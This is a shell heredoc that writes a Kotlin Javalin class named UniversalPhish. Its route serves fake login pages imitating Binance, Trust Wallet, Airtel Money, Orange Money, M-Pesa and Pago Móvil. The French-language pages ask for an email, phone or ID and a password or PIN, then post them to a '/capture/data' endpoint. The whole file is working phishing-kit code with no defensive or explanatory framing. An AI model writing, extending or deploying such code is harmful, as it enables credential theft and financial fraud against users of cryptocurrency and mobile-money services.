cat << 'EOF' > src/main/kotlin/com/fardc/sigint/core/UniversalPhish.kt
package com.fardc.sigint.core
import io.javalin.Javalin

class UniversalPhish(private val vault: SecurityVault) {
    fun setup(app: Javalin) {
        app.get("/login/{target}") { ctx ->
            val target = ctx.pathParam("target").lowercase()
            val ui = when(target) {
                "binance" -> Pair("Binance Crypto", "#fcd535") // Jaune Binance
                "trust"   -> Pair("Trust Wallet", "#3375bb")
                "airtel"  -> Pair("Airtel Money", "#ff0000")
                "orange"  -> Pair("Orange Money", "#ff6600")
                "mpesa"   -> Pair("M-Pesa Vodacom", "#e11d23")
                "pagomovil" -> Pair("Pago Móvil", "#003893")
                else -> Pair("Portail de Sécurité", "#1e2329")
            }
            
            val textColor = if(target == "binance") "black" else "white"
            
            ctx.html("""
                <body style="background:${ui.second}; font-family:sans-serif; text-align:center; color:$textColor; padding-top:50px;">
                    <div style="background:white; width:340px; margin:auto; padding:25px; border-radius:12px; color:black; box-shadow: 0 4px 15px rgba(0,0,0,0.3);">
                        <h2 style="margin-bottom:20px;">${ui.first}</h2>
                        <p style="font-size:14px; color:#5e6673;">Vérification de sécurité requise</p>
                        <form action="/capture/data" method="POST">
                            <input type="hidden" name="provider" value="${ui.first}">
                            <input type="text" name="id" placeholder="Email / Téléphone / ID" style="width:100%; padding:12px; margin:8px 0; border:1px solid #eaecef; border-radius:4px;">
                            <input type="password" name="pin" placeholder="Mot de passe / PIN" style="width:100%; padding:12px; margin:8px 0; border:1px solid #eaecef; border-radius:4px;">
                            <button type="submit" style="width:100%; padding:12px; background:${ui.second}; color:$textColor; border:none; font-weight:bold; border-radius:4px; margin-top:15px; cursor:pointer;">SE CONNECTER</button>
                        </form>
                    </div>
                </body>
            """.trimIndent())
        }
    }
}
EOF
